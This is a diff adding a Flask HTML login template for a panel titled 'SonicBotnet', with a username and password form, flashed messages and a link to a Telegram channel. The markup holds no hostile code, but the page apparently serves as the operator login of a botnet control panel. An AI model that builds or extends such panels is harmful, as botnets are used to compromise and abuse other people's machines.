@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SonicBotnet | Login</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='login.css') }}">
+</head>
+<body>
+    <div class="main-content">
+        <h2>SONIC BOTNET</h2>
+        <form method="POST" action="{{ url_for('login') }}">
+            <div class="content">
+                <label for="username">Username:</label>
+                <input type="text" id="username" class="text-field__input" name="username" required>
+                <label for="password">Password:</label>
+                <input type="password" id="password" class="text-field__input" name="password" required>
+            </div>
+            <button type="submit" class="btn">LOGIN</button>
+        </form>
+        {% with messages = get_flashed_messages() %}
+          {% if messages %}
+            <ul>
+            {% for message in messages %}
+              <li>{{ message }}</li>
+            {% endfor %}
+            </ul>
+          {% endif %}
+        {% endwith %}
+    </div>
+    <a href="https://t.me/sonicbotnetv2" target="_blank">
+    </a>
+</body>
+</html>
